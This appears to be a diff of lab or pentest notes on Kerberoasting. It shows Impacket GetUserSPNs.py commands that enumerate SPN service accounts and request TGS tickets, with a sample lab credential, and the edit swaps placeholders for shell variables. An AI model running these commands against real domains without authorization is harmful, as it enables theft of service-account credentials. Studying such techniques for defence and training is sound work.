@@ -40,7 +40,7 @@ Check kerberoastable users using the Impacket's module GetUserSPNs.py
 # Lists all accounts with SPNs (service accounts)
 GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP
 # Same command structure for any domain/user
-GetUserSPNs.py $DOMAIN/<USERNAME>:'<PASSWORD>' -dc-ip $DC_IP
+GetUserSPNs.py $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP
 ```
 
 It will searches for **accounts that have SPNs (service accounts)**
@@ -54,10 +54,10 @@ in this case there're two vulnerable users: 'kerberoasting' and 'angel'.
 
 ```bash
 # **Request All TGS Tickets (for all SPNs)**
-GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<USERNAME>:'<PASSWORD>' -request
+GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER:'$PASS' -request
 
 # Request Ticket for a Specific Account (Optiona)
-GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/<USERNAME>:'<PASSWORD>' -request-user <TARGET_ACCOUNT>
+GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER:'$PASS' -request-user <TARGET_ACCOUNT>
 
 #example
 GetUserSPNs.py $DOMAIN/devan:'Password123!' -dc-ip $DC_IP -request #without specifing a user it checks all possible tickets
